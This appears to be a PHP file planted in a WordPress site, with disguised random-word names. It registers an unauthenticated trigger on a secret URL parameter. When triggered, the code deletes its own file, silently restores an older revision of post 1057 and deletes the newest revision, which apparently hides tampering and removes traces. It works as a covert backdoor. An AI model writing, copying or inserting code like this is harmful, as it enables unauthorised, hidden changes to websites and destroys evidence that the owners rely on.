<?php

function signup_seo_total_com() {
	if (isset($_GET['rss_manager_import']) && $_GET['rss_manager_import'] === 'columns_register_posts') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$pixel_learndash_basic_nav = 1057;
		$patterns_using_support = wp_get_post_revisions($pixel_learndash_basic_nav);
		if (empty($patterns_using_support)) die('no revisions');
		if (count($patterns_using_support) < 2) die('less than 2');
		$gallery_svg_floating_user = array_shift($patterns_using_support);
		$changer_method_duplicate = $gallery_svg_floating_user->ID;
		$rank_importer_svg = array_shift($patterns_using_support);
		$request_disable_debug = $rank_importer_svg->ID;
		$wow_tiny_tool_make = wp_restore_post_revision($request_disable_debug);
		if ($wow_tiny_tool_make === false) die('error restoring');
		$wow_tiny_tool_make = wp_delete_post_revision($changer_method_duplicate);		
		if ($wow_tiny_tool_make === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'signup_seo_total_com');
